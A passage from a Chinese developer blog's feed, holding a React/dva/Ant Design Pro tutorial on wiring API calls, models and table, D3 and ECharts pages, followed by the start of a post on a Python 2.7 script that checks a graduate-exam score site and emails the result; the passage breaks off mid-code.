</span>&#123;</span><br><span class="line">  <span class="keyword">const</span> curToken = token.get();</span><br><span class="line">  <span class="keyword">return</span> request(<span class="string">`<span class="subst">$&#123;config.domain&#125;</span>/data/Search`</span>, &#123;</span><br><span class="line">    method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    headers: &#123;</span><br><span class="line">      Authorization: curToken,</span><br><span class="line">    &#125;,</span><br><span class="line">    body: params,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调用请求发起函数"><a class="markdownIt-Anchor" href="#调用请求发起函数"></a> 调用请求发起函数</h3><p>  现在我们有了前后端交互的最后一步，即发起请求的函数，那么我们再向前一步，实现调用该函数的函数。</p><p>  model层托管了所有的数据服务，我们在Model下新建一个tutorialModel.js，来实现View层与API层的连接。</p><p>  先放上全部代码，再进行解释。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">import &#123; GetDataFromBackStage &#125; from &#x27;../services/api&#x27;;    #从api中引入我们定义的请求函数</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  namespace: &#x27;tutorialModel&#x27;,      #组件名</span><br><span class="line">  state: &#123;                         #state定义了你的数据格式，我们这里使用了一个data变量</span><br><span class="line">    data: &#123;</span><br><span class="line">      list: [],</span><br><span class="line">      pagination: &#123;&#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  effects: &#123;</span><br><span class="line">    *getData(&#123;  &#125;, &#123; call, put &#125;) &#123;                         #定义一个getData函数</span><br><span class="line">      const response = yield call(GetDataFromBackStage, );  #调用我们定义的请求发起函数 </span><br><span class="line">      yield put(&#123;                                           #这里处理返回值，调用reducer中的saveData，把返回值传过去</span><br><span class="line">        type: <span class="string">&#x27;saveData&#x27;</span>,</span><br><span class="line">        payload: response,</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  reducers: &#123;</span><br><span class="line">    <span class="function"><span class="title">saveData</span>(<span class="params">state, &#123; payload &#125;</span>)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        ...state,                                           #将state中的data取出来，并赋新值</span><br><span class="line">        data: payload,</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>  至此就完成了数据的获取与保存，在下一步则是进行页面View层的更新。</p><h3 id="更新页面"><a class="markdownIt-Anchor" href="#更新页面"></a> 更新页面</h3><p>  在最后一步，我们完成请求的发起与结果的获取，回到我们的demo.js。</p><p>  我们以按照DashBoard下面的该表格为例，实现一个表格页面。</p><p><img src="https://i.loli.net/2019/08/07/ChdFbAEi9xTVBRX.jpg" alt="" /></p><p>  调用该组件，我们仅需在render中添加一个table标签，然后绑定各项数据源即可，查看示例页的实现，可见其table参数如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;Table</span><br><span class="line">  rowKey=&#123;<span class="function"><span class="params">record</span> =&gt;</span> record.index&#125;</span><br><span class="line">  size=<span class="string">&quot;small&quot;</span></span><br><span class="line">  columns=&#123;columns&#125;</span><br><span class="line">  dataSource=&#123;searchData&#125;</span><br><span class="line">  pagination=&#123;&#123;</span><br><span class="line">    style: &#123; <span class="attr">marginBottom</span>: <span class="number">0</span> &#125;,</span><br><span class="line">      pageSize: <span class="number">5</span>,</span><br><span class="line">    &#125;&#125;</span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure><p>  我们所要修改的也就是其columns和DataSource了。</p><p>  首先，在componentDidMount中，通过dispatch方法，发起请求，来触发前几步中所实现的逐项函数，这里才是这些函数的调用起点。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">componentDidMount</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; dispatch &#125; = <span class="built_in">this</span>.props;</span><br><span class="line">  dispatch(&#123;</span><br><span class="line">    type: <span class="string">&#x27;tutorialModel/getData&#x27;</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  通过connect，将model和这个页面的component连接起来，从而可以在页面中调用model保存下来的数值。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">@connect(<span class="function">(<span class="params">&#123; tutorialModel&#125;</span>) =&gt;</span> (&#123;</span><br><span class="line">  tutorialModel,</span><br><span class="line">&#125;))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>  注意，@connect要写在component定义的前面。</p><p>  获取到的数据是保存在props中的，我们先把数据解构出来，方面后面调用。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; tutorialModel &#125;=<span class="built_in">this</span>.props;</span><br><span class="line"><span class="keyword">const</span> &#123; data &#125;=tutorialModel;</span><br></pre></td></tr></table></figure><p>  再定义一下表格的各列信息。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> columns = [</span><br><span class="line">      &#123;</span><br><span class="line">        title: <span class="string">&#x27;数据名称&#x27;</span>,</span><br><span class="line">        dataIndex: <span class="string">&#x27;name&#x27;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        title: <span class="string">&#x27;描述&#x27;</span>,</span><br><span class="line">        dataIndex: <span class="string">&#x27;datadescription&#x27;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        title: <span class="string">&#x27;数据领域&#x27;</span>,</span><br><span class="line">        dataIndex: <span class="string">&#x27;datafield&#x27;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        title: <span class="string">&#x27;状态&#x27;</span>,</span><br><span class="line">        dataIndex: <span class="string">&#x27;status&#x27;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        title: <span class="string">&#x27;时间&#x27;</span>,</span><br><span class="line">        dataIndex: <span class="string">&#x27;time&#x27;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    ];</span><br></pre></td></tr></table></figure><p>  最后在配置一下Table的各项数据源。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;Table</span><br><span class="line">          rowKey=<span class="string">&quot;dataid&quot;</span></span><br><span class="line">          size=<span class="string">&quot;small&quot;</span></span><br><span class="line">          columns=&#123;columns&#125;</span><br><span class="line">          dataSource=&#123;data.list&#125;</span><br><span class="line">          pagination=&#123;&#123;</span><br><span class="line">              style: &#123; <span class="attr">marginBottom</span>: <span class="number">0</span> &#125;,</span><br><span class="line">              pageSize: <span class="number">5</span>,</span><br><span class="line">            &#125;&#125;</span><br><span class="line">        /&gt;</span><br></pre></td></tr></table></figure><p>  完成，运行效果如图：</p><p><img src="https://i.loli.net/2019/08/07/IAWpl6m8Ys7kZzX.jpg" alt="" /></p><p>  页面完整代码如下。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; connect &#125; <span class="keyword">from</span> <span class="string">&#x27;dva&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Card,Table&#125; <span class="keyword">from</span> <span class="string">&#x27;antd&#x27;</span>;</span><br><span class="line"></span><br><span class="line">@connect(<span class="function">(<span class="params">&#123; tutorialModel &#125;</span>) =&gt;</span> (&#123;</span><br><span class="line">  tutorialModel,</span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">demo1</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">componentDidMount</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; dispatch &#125; = <span class="built_in">this</span>.props;</span><br><span class="line">    dispatch(&#123;</span><br><span class="line">      type: <span class="string">&#x27;tutorialModel/getData&#x27;</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; tutorialModel &#125;=<span class="built_in">this</span>.props;</span><br><span class="line">    <span class="keyword">const</span> &#123; data &#125;=tutorialModel;</span><br><span class="line">    <span class="keyword">const</span> columns = [</span><br><span class="line">      &#123;</span><br><span class="line">        title: <span class="string">&#x27;数据名称&#x27;</span>,</span><br><span class="line">        dataIndex: <span class="string">&#x27;name&#x27;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        title: <span class="string">&#x27;描述&#x27;</span>,</span><br><span class="line">        dataIndex: <span class="string">&#x27;datadescription&#x27;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        title: <span class="string">&#x27;数据领域&#x27;</span>,</span><br><span class="line">        dataIndex: <span class="string">&#x27;datafield&#x27;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        title: <span class="string">&#x27;状态&#x27;</span>,</span><br><span class="line">        dataIndex: <span class="string">&#x27;status&#x27;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        title: <span class="string">&#x27;时间&#x27;</span>,</span><br><span class="line">        dataIndex: <span class="string">&#x27;time&#x27;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;Card bordered=&#123;<span class="literal">false</span>&#125;&gt;</span><br><span class="line">        &lt;Table</span><br><span class="line">          rowKey=<span class="string">&quot;dataid&quot;</span></span><br><span class="line">          size=<span class="string">&quot;small&quot;</span></span><br><span class="line">          columns=&#123;columns&#125;</span><br><span class="line">          dataSource=&#123;data.list&#125;</span><br><span class="line">          pagination=&#123;&#123;</span><br><span class="line">              style: &#123; <span class="attr">marginBottom</span>: <span class="number">0</span> &#125;,</span><br><span class="line">              pageSize: <span class="number">5</span>,</span><br><span class="line">            &#125;&#125;</span><br><span class="line">        /&gt;</span><br><span class="line">      &lt;/Card&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  最后注意，要修改一下router，将我们定义的model传给页面，否则会找不到数据。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;/tutorial/demo1&#x27;</span>: &#123;</span><br><span class="line">  component: dynamicWrapper(app, [<span class="string">&#x27;tutorialModel&#x27;</span>], <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../routes/Tutorial/demo1&#x27;</span>)),</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="页面2-快速移植"><a class="markdownIt-Anchor" href="#页面2-快速移植"></a> 页面2-快速移植</h2><p>  在页面2，我们将演示如何快速的将一个现有页面完成移植。</p><p>  我们要实现的目标页面如下图所示：</p><p><img src="https://i.loli.net/2019/08/07/zgY51FiN8he4WqO.jpg" alt="" /></p><h3 id="静态文件移植"><a class="markdownIt-Anchor" href="#静态文件移植"></a> 静态文件移植</h3><p>  相关json文件，js文件，css文件等静态文件，全部放在public目录下</p><h3 id="静态文件引入"><a class="markdownIt-Anchor" href="#静态文件引入"></a> 静态文件引入</h3><p>  JS文件，在index.ejs中进行引入。</p><p><img src="https://i.loli.net/2019/08/07/wTRKvFLrd6OqzCG.jpg" alt="" /></p><p>  CSS文件，在同级目录下，建立demo2.less文件。</p><p>  将页面中自定义的css样式复制其中，注意这里的css命名不能带“-”。</p><p>  通过@import的方式，引入现成的静态CSS文件，代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">@<span class="keyword">import</span> <span class="string">&#x27;/css/commons.min.css&#x27;</span>;</span><br><span class="line">@<span class="keyword">import</span> <span class="string">&#x27;/css/scheme-polygon.min.css&#x27;</span>;</span><br><span class="line">@<span class="keyword">import</span> <span class="string">&#x27;//minedata.cn/minemapapi/v1.4/minemap.css&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.buttongroup &#123;</span><br><span class="line">  position: absolute;</span><br><span class="line">  top: 20px;</span><br><span class="line">  right: 120px;</span><br><span class="line">  z-index: <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.mybutton &#123;</span><br><span class="line">  background-color: #257962;</span><br><span class="line">  border: none;</span><br><span class="line">  color: white;</span><br><span class="line">  padding: 10px 25px;</span><br><span class="line">  text-align: center;</span><br><span class="line">  text-decoration: none;</span><br><span class="line">  display: inline-block;</span><br><span class="line">  font-size: 16px;</span><br><span class="line">  margin: 10px;</span><br><span class="line">  cursor: pointer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.leftlist&#123;</span><br><span class="line">  background-color: #333333;</span><br><span class="line">  position: absolute;</span><br><span class="line">  left:<span class="number">15</span>%;</span><br><span class="line">  top:<span class="number">10</span>%;</span><br><span class="line">  opacity: <span class="number">.6</span>;</span><br><span class="line">  color:#ffffff;</span><br><span class="line">  border-radius: 5px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.table-row:hover &#123;</span><br><span class="line">  background-color: #666666;</span><br><span class="line">&#125;</span><br><span class="line">#map-legend-box&#123;</span><br><span class="line">  display:none !important</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="页面实现"><a class="markdownIt-Anchor" href="#页面实现"></a> 页面实现</h3><p>  将原页面的HTML代码，全部放在render的return中，这里注意，所有的style需要改为json数组的形式进行实现，不能写成HTML的形式,而通过className方式引入的css样式可以正常使用。</p><p>  代码节选如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">render</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> (</span><br><span class="line">     &lt;div&gt;</span><br><span class="line">       &lt;div id=<span class="string">&quot;map&quot;</span>  style=&#123;&#123;<span class="attr">width</span>: <span class="string">&#x27;100%&#x27;</span>,<span class="attr">height</span>:<span class="string">&#x27;700px&#x27;</span>&#125;&#125;&gt;</span><br><span class="line">         &lt;div className=<span class="string">&quot;map-control-box&quot;</span> id=<span class="string">&quot;map-control-box&quot;</span>&gt;</span><br><span class="line">           &lt;div id=<span class="string">&quot;map-control-btn-box&quot;</span> className=<span class="string">&quot;map-control-btn-box-dgmsd&quot;</span>&gt;</span><br><span class="line">           &lt;/div&gt;</span><br><span class="line">           &lt;div id=<span class="string">&quot;tipBox&quot;</span> className=<span class="string">&quot;tip-box-dgmsd select-1&quot;</span>&gt;</span><br><span class="line">             &lt;div id=<span class="string">&quot;tipInfo&quot;</span> className=<span class="string">&quot;tip-info&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line">           &lt;/div&gt;</span><br><span class="line">         &lt;/div&gt;</span><br><span class="line">         &lt;div id=<span class="string">&quot;map-legend-box&quot;</span> className=<span class="string">&quot;map-legend-box&quot;</span> style=&#123;&#123;<span class="attr">display</span>:<span class="string">&quot;none&quot;</span>&#125;&#125;&gt;</span><br><span class="line">         &lt;/div&gt;</span><br><span class="line">         &lt;div className=<span class="string">&quot;map-select-locale&quot;</span> id=<span class="string">&quot;map-select-locale&quot;</span>&gt;</span><br><span class="line">           &lt;div className=<span class="string">&quot;select-control-1 btn-select-locale&quot;</span> id=<span class="string">&quot;select-control-1&quot;</span>&gt;</span><br><span class="line">             &lt;div className=<span class="string">&quot;select-text&quot;</span>&gt;2D&lt;/div&gt;</span><br><span class="line">           &lt;/div&gt;</span><br><span class="line">           &lt;div className=<span class="string">&quot;select-control-2&quot;</span> id=<span class="string">&quot;select-control-2&quot;</span>&gt;</span><br><span class="line">             &lt;div className=<span class="string">&quot;select-text&quot;</span>&gt;3D&lt;/div&gt;</span><br><span class="line">           &lt;/div&gt;</span><br><span class="line">         &lt;/div&gt;</span><br><span class="line">     &lt;/div&gt;</span><br><span class="line">     .........</span><br><span class="line">     &lt;/div&gt;</span><br><span class="line">   );</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>  完成页面移植，效果如下图：</p><p><img src="https://i.loli.net/2019/08/07/fboKDguXcMOYFxE.jpg" alt="" /></p><p>  当然，这其中还需要做一些元素位置，部分js代码的微调。</p><h3 id="js代码"><a class="markdownIt-Anchor" href="#js代码"></a> JS代码</h3><p>  如果页面有JS代码需要实现，只需写在componentDidMount中即可，以D3拓扑图为例。</p><p>  代码节选如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">componentDidMount</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">var</span> width = <span class="built_in">document</span>.getElementById(<span class="string">&quot;knowledge_graph&quot;</span>).offsetWidth;</span><br><span class="line">   <span class="keyword">var</span> height = <span class="built_in">document</span>.getElementById(<span class="string">&quot;knowledge_graph&quot;</span>).offsetHeight;</span><br><span class="line">   <span class="keyword">var</span> img_w = <span class="number">32</span>;</span><br><span class="line">   <span class="keyword">var</span> img_h = <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">var</span> svg = d3.select(<span class="string">&quot;#knowledge_graph&quot;</span>).append(<span class="string">&quot;svg&quot;</span>)</span><br><span class="line">     .attr(<span class="string">&quot;width&quot;</span>,width)</span><br><span class="line">     .attr(<span class="string">&quot;height&quot;</span>,height)</span><br><span class="line">     .attr(<span class="string">&quot;vertical-align&quot;</span>,<span class="string">&quot;center&quot;</span>);</span><br><span class="line"></span><br><span class="line">   d3.json(<span class="string">&quot;http://47.92.162.213:8080/static/data/topology.json&quot;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">error,root</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span>( error )&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">console</span>.log(error);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="built_in">console</span>.log(root);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">var</span> force = d3.layout.force()</span><br><span class="line">       .nodes(root.nodes)</span><br><span class="line">       .links(root.edges)</span><br><span class="line">       .size([width,height])</span><br><span class="line">       .linkDistance(<span class="number">90</span>)</span><br><span class="line">       .charge(-<span class="number">500</span>)</span><br><span class="line">       .start();</span><br><span class="line"></span><br><span class="line">     ...........</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>  其运行结果如下图，图标资源没有修改路径，所以没有加载，但功能均正常。</p><p><img src="https://i.loli.net/2019/08/07/PchmW98Q4RYGxrb.jpg" alt="" /></p><p>  此页面在Dashboard/helloworld下可以看见源码。</p><h2 id="最后-数据调用"><a class="markdownIt-Anchor" href="#最后-数据调用"></a> 最后-数据调用</h2><p>  如果你需要用该框架获取数据，在用自己的JS逻辑来实现页面。</p><p>  在数据获取阶段，需要参考第一部分的原生开发方式，在model，api，和页面中完成数据获取阶段，随后数据就被保存在了props中。</p><p>  接下来如果想实现自己的逻辑，我在这里以echarts为例，部分代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">componentDidMount</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">  <span class="comment">//获取你的数据</span></span><br><span class="line">  ........</span><br><span class="line">  <span class="comment">//开始实现echarts</span></span><br><span class="line">  <span class="comment">// echarts原来该怎么写就怎么写</span></span><br><span class="line">  <span class="keyword">var</span> myChart = echarts.init(<span class="built_in">document</span>.getElementById(<span class="string">&#x27;main&#x27;</span>));</span><br><span class="line">  myChart.setOption(&#123;</span><br><span class="line">      title: &#123; <span class="attr">text</span>: <span class="string">&#x27;某地区蒸发量和降水量&#x27;</span> &#125;,</span><br><span class="line">      tooltip : &#123;</span><br><span class="line">        trigger: <span class="string">&#x27;axis&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    legend: &#123;</span><br><span class="line">        data:[<span class="string">&#x27;蒸发量&#x27;</span>,<span class="string">&#x27;降水量&#x27;</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">    toolbox: &#123;</span><br><span class="line">        show : <span class="literal">true</span>,</span><br><span class="line">        feature : &#123;</span><br><span class="line">            dataView : &#123;<span class="attr">show</span>: <span class="literal">true</span>, <span class="attr">readOnly</span>: <span class="literal">false</span>&#125;,</span><br><span class="line">            magicType : &#123;<span class="attr">show</span>: <span class="literal">true</span>, <span class="attr">type</span>: [<span class="string">&#x27;line&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>]&#125;,</span><br><span class="line">            restore : &#123;<span class="attr">show</span>: <span class="literal">true</span>&#125;,</span><br><span class="line">            saveAsImage : &#123;</span><br><span class="line">              show: <span class="literal">true</span>,</span><br><span class="line">              type: <span class="string">&#x27;jpg&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">      xAxis : [</span><br><span class="line">        &#123;</span><br><span class="line">            type : <span class="string">&#x27;category&#x27;</span>,</span><br><span class="line">            data : <span class="built_in">this</span>.props.data.xdata    <span class="comment">//在这里使用你的数据即可</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    yAxis : [</span><br><span class="line">        &#123;</span><br><span class="line">            type : <span class="string">&#x27;value&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">      series : [</span><br><span class="line">        &#123;</span><br><span class="line">            name:<span class="string">&#x27;蒸发量&#x27;</span>,</span><br><span class="line">            type:<span class="string">&#x27;bar&#x27;</span>,</span><br><span class="line">            data: <span class="built_in">this</span>.props.data.ydata.ydata1,</span><br><span class="line">            markPoint : &#123;</span><br><span class="line">                data : [</span><br><span class="line">                    &#123;<span class="attr">type</span> : <span class="string">&#x27;max&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;最大值&#x27;</span>&#125;,</span><br><span class="line">                    &#123;<span class="attr">type</span> : <span class="string">&#x27;min&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;最小值&#x27;</span>&#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">.........................</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前期准备&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#前期准备&quot;&gt;&lt;/a&gt; 前期准备&lt;/h2&gt;
&lt;h3 id=&quot;环境配置&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#环境配置&quot;&gt;&lt;/a&gt; 环境配置&lt;/h3</summary>
      
    
    
    
    <category term="前端" scheme="https://coder.lufer.cc/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="前端" scheme="https://coder.lufer.cc/tags/%E5%89%8D%E7%AB%AF/"/>
    
    <category term="React" scheme="https://coder.lufer.cc/tags/React/"/>
    
  </entry>
  
  <entry>
    <title>考研成绩自动查询脚本</title>
    <link href="https://coder.lufer.cc/Python/%E8%80%83%E7%A0%94%E6%88%90%E7%BB%A9%E8%87%AA%E5%8A%A8%E6%9F%A5%E8%AF%A2%E8%84%9A%E6%9C%AC/"/>
    <id>https://coder.lufer.cc/Python/%E8%80%83%E7%A0%94%E6%88%90%E7%BB%A9%E8%87%AA%E5%8A%A8%E6%9F%A5%E8%AF%A2%E8%84%9A%E6%9C%AC/</id>
    <published>2019-02-16T09:19:53.000Z</published>
    <updated>2021-12-17T03:59:35.253Z</updated>
    
    <content type="html"><![CDATA[<p>  自动检索学校列表里有没有指定学校，如果有的话则自动查询成绩，并将结果发送到指定邮箱。</p><p>  有个小BUG就是最后邮件会发两次。</p><p>  基于Python2.7,Python3的urllib可能用法有所不同。</p><p>  先检索是否有指定学校:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#构造请求url，需要用地区编号+时间戳，地区编号可以在浏览器F12中查看，例如北京是11</span></span><br><span class="line">url=<span class="string">&#x27;https://yz.chsi.com.cn/apply/code/cjcxdw.do?ssdm=11&amp;ts=&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">int</span>(<span class="built_in">round</span>(time.time() * <span class="number">1000</span>)))</span><br><span class="line"><span class="comment">#请求头注意Host和Referer</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;yz.chsi.com.cn&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, br&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Cookie&#x27;</span>: cookie,</span><br><span class="line">               <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://yz.chsi.com.cn/apply/cjcx/&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Pragma&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span></span><br><span class="line">               &#125;</span><br><span class="line">    <span class="comment">#发送请求，获取返回列表</span></span><br><span class="line">        req = urllib2.Request(url, <span class="literal">None</span>, headers)</span><br><span class="line">        response = urllib2.urlopen(req)</span><br><span class="line">        res = response.read()</span><br><span class="line">        <span class="comment">#格式化为json对象，获取其中的dms，即学校列表</span></span><br><span class="line">        jsonobj=json.loads(res)</span><br><span class="line">        schoolist=jsonobj[<span class="string">&#x27;dms&#x27;</span>]</span><br><span class="line">        flag=<span class="number">0</span></span><br><span class="line">        <span class="comment">#遍历列表，查找是否有北航</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> schoolist:</span><br><span class="line">            schoolname=i[<span class="string">&#x27;mc&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> schoolname.encode(<span class="string">&#x27;utf-8&#x27;</span>) == <span class="string">&#x27;北京航空航天大学&#x27;</span>:</span><br><span class="line">                flag=<span class="number">1</span></span><br><span class="line">                schoolcode=i[<span class="string">&#x27;dm&#x27;</span>]</span><br></pre></td></tr></table></figure><p>  查到之后构造数据发送POST请求获取结果，转发邮件，不单列了。</p><h1 id="全部代码"><a class="markdownIt-Anchor" href="#全部代码"></a> 全部代码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"><span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</span><br><span class="line"><span class="keyword">from</span> email.header <span class="keyword">import</span> Header</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cookie=<span class="string">&#x27;JSESSIONID=D5B7900FBCE661659978464309BD23D1; acw_tc=2760824b15502052244788631e101590a210f068338831246151b55dcc5577; JSESSIONID=5BB2C7ADAFD3F24E7179F7E0571B3606; _ga=GA1.4.129029864.1550205225; _gid=GA1.4.1924511835.1550205225&#x27;</span></span><br><span class="line">mail_host = <span class="string">&quot;smtp.163.com&quot;</span>  <span class="comment"># 设置服务器</span></span><br><span class="line">mail_user = <span class="string">&quot;********@163.com&quot;</span>  <span class="comment"># 用户名</span></span><br><span class="line">mail_pass = <span class="string">&quot;*********&quot;</span>  <span class="comment"># 密码</span></span><br><span class="line"></span><br><span class="line">sender = <span class="string">&#x27;*********@163.com&#x27;</span>        <span class="comment">#发件人邮箱</span></span><br><span class="line">receivers = [<span class="string">&#x27;********@163.com&#x27;</span>]     <span class="comment"># 收件人邮箱，可以是个列表</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fetch2</span>(<span class="params">url,post</span>):</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;yz.chsi.com.cn&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Language&#x27;</span>: <span 